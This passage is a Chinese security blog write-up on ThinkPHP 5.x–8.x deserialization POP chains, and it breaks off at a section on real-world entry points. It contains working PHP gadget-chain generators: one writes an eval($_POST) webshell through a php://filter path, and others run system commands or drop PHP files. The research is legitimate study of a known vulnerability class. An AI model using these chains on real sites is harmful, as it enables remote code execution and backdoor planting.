+	<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+
+<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> 
+	<span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=111PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+/../nb.php'</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'expire'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'cache_subdir'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'prefix'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'0'</span><span class="token punctuation">,</span>
+	<span class="token string single-quoted-string">'data_compress'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">protected</span> <span class="token variable">$tag</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>
+	<span class="token variable">$fileObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$memObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">(</span><span class="token variable">$fileObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$outputObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">(</span><span class="token variable">$memObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$queryObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$outputObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$hasoneObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">(</span><span class="token variable">$queryObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$pivotObj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token variable">$hasoneObj</span><span class="token punctuation">,</span> <span class="token variable">$outputObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$pivotObj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最终效果：</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913153902668.png" alt="image-20240913153902668" /></p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240913155426725.png" alt="image-20240913155426725" /></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.0.X反序列化利用链.md</a></p>
+<p>这篇blog还提到了如果目录不允许写入文件，通过其他方法创建文件。</p>
+<h3 id="四-其他版本的反序列化链分析"><a class="markdownIt-Anchor" href="#四-其他版本的反序列化链分析"></a> 四、其他版本的反序列化链分析</h3>
+<p>测试发现5.0的不同小版本的函数稍微有些区别</p>
+<p>后面有空再分析， 可以参考一下这篇文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/251318#h2-1">https://www.anquanke.com/post/id/251318#h2-1</a></p>
+<h2 id="2thinkphp-51x-反序列化"><a class="markdownIt-Anchor" href="#2thinkphp-51x-反序列化"></a> ②ThinkPHP 5.1.x 反序列化</h2>
+<p>TP5.1的反序列化比TP5.0的要简单的不少</p>
+<p>测试版本：5.1.37</p>
+<h3 id="一-反序列化调通过程"><a class="markdownIt-Anchor" href="#一-反序列化调通过程"></a> 一、反序列化调通过程</h3>
+<h4 id="1-入口点"><a class="markdownIt-Anchor" href="#1-入口点"></a> 1. 入口点</h4>
+<p>入口寻找__destruct方法，与TP5.0相同</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135349542.png" alt="image-20240914135349542" /></p>
+<h4 id="2-tostring-魔术方法"><a class="markdownIt-Anchor" href="#2-tostring-魔术方法"></a> 2. ToString 魔术方法</h4>
+<p>依旧是此方法触发tostring</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135424121.png" alt="image-20240914135424121" /></p>
+<h4 id="3-中途利用点"><a class="markdownIt-Anchor" href="#3-中途利用点"></a> 3. 中途利用点</h4>
+<p>这里看一下getAttr方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135839679.png" alt="image-20240914135839679" /></p>
+<p>这里有一处函数变量</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914135922286.png" alt="image-20240914135922286" /></p>
+<h4 id="4构造中途条件"><a class="markdownIt-Anchor" href="#4构造中途条件"></a> 4.构造中途条件</h4>
+<p>这条函数方法的pop链的条件很好构造：</p>
+<ol>
+<li>toarray方法的逻辑，可以直接进入，只要赋值data就可以，就可以进入下图中的getAttr方法</li>
+</ol>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914154545662.png" alt="image-20240914154545662" /></p>
+<ol start="2">
+<li>if逻辑可以赋值类参数解决，看一下<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mi mathvariant="normal">和</mi></mrow><annotation encoding="application/x-tex">closure和</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">和</span></span></span></span>value的值如何获取即可。</li>
+</ol>
+<p>value是拿的data数组的name键值对应的值</p>
+<p>closure是拿的withAttr数组的name键值对应的值</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914154708798.png" alt="image-20240914154708798" /></p>
+<h3 id="二-poc编写"><a class="markdownIt-Anchor" href="#二-poc编写"></a> 二、POC编写</h3>
+<p>写之前注意两个问题：</p>
+<ul>
+<li>PHP中函数参数超出时会忽略，因此这里我们可以理解成可以调用一个参数的函数。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>l</mi><mi>o</mi><mi>s</mi><mi>u</mi><mi>r</mi><mi>e</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">closure(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">u</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mopen">(</span></span></span></span>value)，当然这里情况可能更好一点，因为图中的$this-&gt;data其实也是可控的。</li>
+<li>写poc时，因为触发点的类是trait的，而use这些类的Model是抽象类，写poc时，要找子类，定义属性的时候，一定要把属性定义到抽象类里面，而不是定义在子类里面。</li>
+</ul>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
+
+namespace think\process\pipes&#123;
+	Class Windows&#123;
+		private $files;
+		function __construct($a)&#123;
+			$this-&gt;files &#x3D; [$a];
+		&#125;
+	&#125;
+&#125;
+
+namespace think\model&#123;
+	Class Pivot&#123;
+		private $data &#x3D; [&#39;system&#39;&#x3D;&gt;&#39;calc&#39;];
+		private $withAttr &#x3D; [&#39;system&#39; &#x3D;&gt; &#39;system&#39;];
+		
+	&#125;
+
+&#125;
+
+namespace&#123;
+	$p &#x3D; new \think\model\Pivot();
+	$w &#x3D; new \think\process\pipes\Windows($p);
+	echo base64_encode(serialize($w));
+&#125;
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>很优美的一条链</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914155309217.png" alt="image-20240914155309217" /></p>
+<p>如果想更实战化一点，我们可以选择调用file_put_contents方法，因为上面也分析过，这里的data也是可控的。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914161202840.png" alt="image-20240914161202840" /></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">abstract</span> <span class="token keyword">Class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token operator">=></span><span class="token string single-quoted-string">'914.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'1'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'&lt;?php phpinfo()?>'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'file_put_contents'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">Class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span>
+		<span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
+		<span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token variable">$a</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">use</span> <span class="token package"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
+	<span class="token keyword">Class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span>
+		
+	<span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span><span class="token punctuation">&#123;</span>
+	<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token variable">$w</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$w</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="三-其他反序列化链分析"><a class="markdownIt-Anchor" href="#三-其他反序列化链分析"></a> 三、其他反序列化链分析</h3>
+<p>上面分析的链其实很简单，当然5.1还有另一个常见的链，具体如下：</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1040/#_1">https://paper.seebug.org/1040/#_1</a></p>
+<p>这个利用了TP的filterValue类（变量覆盖RCE那里），最终触发了callback执行，有精力再学习一下</p>
+<h2 id="3thinkphp-52x-反序列化"><a class="markdownIt-Anchor" href="#3thinkphp-52x-反序列化"></a> ③ThinkPHP 5.2.x 反序列化</h2>
+<p>搭建环境失败了</p>
+<p>看一下这篇文章参考一下吧。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.2.X%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE.md">https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5.2.X反序列化利用链.md</a></p>
+<p>实际上和上面分析的5.1.x的链是一样的。</p>
+<h2 id="4-thinkphp60x-反序列化"><a class="markdownIt-Anchor" href="#4-thinkphp60x-反序列化"></a> ④ ThinkPHP6.0.x 反序列化</h2>
+<p>tp6.0.x网上说低版本可以复用5.1.x后半部分的链接。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12630">https://xz.aliyun.com/t/12630</a> 可以看一下这篇文章</p>
+<p>但是本地安装发现，低版本实际上也已经patch过了，因此去找其他链</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914174452400.png" alt="image-20240914174452400" /></p>
+<p>后面的链的测试版本6.0.1</p>
+<h3 id="一-反序列化调通过程-2"><a class="markdownIt-Anchor" href="#一-反序列化调通过程-2"></a> 一、反序列化调通过程</h3>
+<p>实际上发现在另一个逻辑上，也可能存在变量函数。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914174922818.png" alt="image-20240914174922818" /></p>
+<p>那先找toString方法触发地。</p>
+<h4 id="1寻找tostring方法触发点"><a class="markdownIt-Anchor" href="#1寻找tostring方法触发点"></a> 1.寻找toString方法触发点</h4>
+<p>字符串拼接触发toString方法</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240914180702711.png" alt="image-20240914180702711" /></p>
+<p>触发toString的在此处，上面最后一步的$this-&gt;db()方法。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918143311766.png" alt="image-20240918143311766" /></p>
+<h3 id="二-poc编写-2"><a class="markdownIt-Anchor" href="#二-poc编写-2"></a> 二、POC编写</h3>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+
+<span class="token keyword">namespace</span> <span class="token package">think</span> <span class="token punctuation">&#123;</span>
+    
+    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span> <span class="token punctuation">&#123;</span>
+        
+        <span class="token keyword">private</span> <span class="token variable">$lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token variable">$exists</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
+        <span class="token keyword">private</span> <span class="token variable">$withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+        <span class="token keyword">protected</span> <span class="token variable">$jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+
+        
+        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lazySave</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">exists</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">table</span> <span class="token operator">=</span> <span class="token variable">$obj</span><span class="token punctuation">;</span>    
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">withAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token operator">=></span><span class="token punctuation">[</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">json</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'calc'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">jsonAssoc</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>
+    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918142310829.png" alt="image-20240918142310829" /></p>
+<h3 id="三-其他反序列化链分析-2"><a class="markdownIt-Anchor" href="#三-其他反序列化链分析-2"></a> 三、其他反序列化链分析</h3>
+<p>分析一下另一个写文件的利用链</p>
+<p>上面分析过_toString的触发，这里找一下toString的其他利用位置：</p>
+<p>下图中的类是可以走到__call方法的</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918100505845.png" alt="image-20240918100505845" /></p>
+<p>__call方法的利用点就多了，继续找一下</p>
+<p>output类可以调用任意类的write方法。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918105538579.png" alt="image-20240918105538579" /></p>
+<p>跟入到file类，依旧是任意类的write方法，但是第一个参数已经可控了。第二个参数会是我们上面write传的第一个messages参数。（就是最初触发点的参数）</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918105748941.png" alt="image-20240918105748941" /></p>
+<p>接下来继续找两个参数的write方法。file类完美符合要求。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918110305467.png" alt="image-20240918110305467" /></p>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php  
+namespace think\model\concern&#123;  
+    trait Attribute&#123;  
+        private $data &#x3D; [&#39;test&#39;]; 
+    &#125;  
+&#125;  
+
+namespace think\view\driver&#123;  
+    class Php&#123;&#125;  
+&#125;
+namespace think\session\driver&#123;
+    class File&#123;
+
+    &#125;
+&#125;
+namespace League\Flysystem&#123;
+    class File&#123;
+        protected $path;
+        protected $filesystem;
+        public function __construct($File)&#123;
+            $this-&gt;path&#x3D;&#39;test.php&#39;;
+            $this-&gt;filesystem&#x3D;$File;
+        &#125;
+    &#125;
+&#125;
+namespace think\console&#123;
+    use League\Flysystem\File;
+    class Output&#123;
+        protected $styles&#x3D;[];
+        private $handle;
+        public function __construct($File)&#123;
+            $this-&gt;styles[]&#x3D;&#39;getDomainBind&#39;;
+            $this-&gt;handle&#x3D;new File($File);
+        &#125;
+    &#125;
+&#125;  
+namespace think&#123;  
+    abstract class Model&#123;  
+        use model\concern\Attribute;  
+        private $lazySave;  
+        protected $withEvent;  
+        protected $table;  
+        function __construct($cmd,$File)&#123;  
+            $this-&gt;lazySave &#x3D; true;  
+            $this-&gt;withEvent &#x3D; false;  
+            $this-&gt;table &#x3D; new route\Url(new Middleware,new console\Output($File),$cmd);  
+        &#125;  
+    &#125;  
+    class Middleware&#123;  
+        public $request &#x3D; 2333;  
+    &#125;   
+&#125;  
+
+namespace think\model&#123;  
+    use think\Model;  
+    class Pivot extends Model&#123;&#125;   
+&#125;  
+
+namespace think\route&#123;  
+    class Url  
+    &#123;  
+        protected $url &#x3D; &#39;a:&#39;;  
+        protected $domain;  
+        protected $app;  
+        protected $route;  
+        function __construct($app,$route,$cmd)&#123;  
+            $this-&gt;domain &#x3D; $cmd;  
+            $this-&gt;app &#x3D; $app;  
+            $this-&gt;route &#x3D; $route;  
+        &#125;  
+    &#125;  
+&#125;  
+
+namespace&#123;  
+    echo base64_encode(serialize(new think\Model\Pivot(&#39;&lt;?php phpinfo(); exit(); ?&gt;&#39;,new think\session\driver\File)));  
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="5thinkphp61x反序列化"><a class="markdownIt-Anchor" href="#5thinkphp61x反序列化"></a> ⑤ThinkPHP6.1.x反序列化</h2>
+<p>测试版本6.1.4</p>
+<p>tp6.0的链可以通用</p>
+<ul>
+<li>命令执行</li>
+</ul>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918142423600.png" alt="image-20240918142423600" /></p>
+<ul>
+<li>
+<p>写文件</p>
+<p>6.1 版本默认不携带Flysytem类，导致上面分析的写文件链无法再次使用。</p>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918143955561.png" alt="image-20240918143955561" /></p>
+</li>
+</ul>
+<p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918143857435.png" alt="image-20240918143857435" /></p>
+<h2 id="6thinkphp80x反序列化"><a class="markdownIt-Anchor" href="#6thinkphp80x反序列化"></a> ⑥ThinkPHP8.0.x反序列化</h2>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14904">https://xz.aliyun.com/t/14904</a></p>
+<p>暂时不自己分析了，可以看一下这篇文章，其实上面分析了这么多条链。自己挖掘也就很简单了</p>
+<p>文章中也是toString走到call，然后走到callback的sink点，完成了利用。</p>
+<p>主要难点在于if条件的构造，确实是个麻烦的大工程。</p>
+<p>顺带推荐一个题目：强网杯pop_master</p>
+<h1 id="0x02-实战利用"><a class="markdownIt-Anchor" href="#0x02-实战利用"></a> 0x02 实战利用</h1>
+<p>刚开始学反序列化的时候一直有疑问，tp的反序列化漏洞如何利用呢？？为什么网络上都是分析pop链，而很少有实战的例子呢？</p>
+<p>其实这也就引出了反序列化漏洞的前提：</p>
+<ul>
+<li>存在反序列化pop链</li>
+<li>存在反序列化的入口，也就是接收数据并进行反序列化的操作。</li>
+</ul>
+<p>因为tp实质上是一个框架，所以你并不知道开发者可能如何写业务，如果业务中涉及到处理对象，那就很有可能写了反序列化的入口。</p>
+<p>总结一下，实战中的入口主要有如下：</p>
